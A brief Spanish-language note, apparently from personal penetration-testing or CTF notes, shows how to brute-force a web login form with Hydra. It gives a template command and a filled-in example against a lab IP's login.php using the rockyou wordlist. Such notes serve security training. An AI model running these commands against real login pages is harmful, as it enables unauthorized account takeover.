Deberemos usar una herramienta como *Burpsuite* para extraer los datos de la petición para usar la fuerza bruta.

# HYDRA

# Petición Post
```bash
hydra -l <"Usuario"> -P <"Diccionario de contraseñas"> <"IP Victima"> http-post-form "<"URL Peticion">:<"Campo peticion usuario">=<"Usuario">&<"Campo peiticion contraseña">=^PASS^:<"Texto en el HTML que indique error">"
```

```bash
sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid Password!"
```